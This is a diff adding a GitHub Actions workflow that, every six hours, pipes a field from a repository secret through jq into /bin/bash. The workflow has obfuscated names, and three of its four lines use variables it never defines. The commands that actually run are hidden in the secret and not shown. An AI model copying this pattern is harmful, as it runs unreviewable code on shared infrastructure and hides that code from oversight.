@@ -1,0 +1,20 @@
+name: jianyicaoqing
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jianyicaoqing
+        env:
+          pmj40: ${{ secrets.pmj40 }}
+        run: |
+          echo $pmj40 | jq -r .v7 | /bin/bash
+          echo $elww29983 | jq -r .nmt36887 | /bin/bash
+          echo $chol5 | jq -r .jhqaq1 | /bin/bash
+          echo $qg8 | jq -r .gnuu34974 | /bin/bash
+
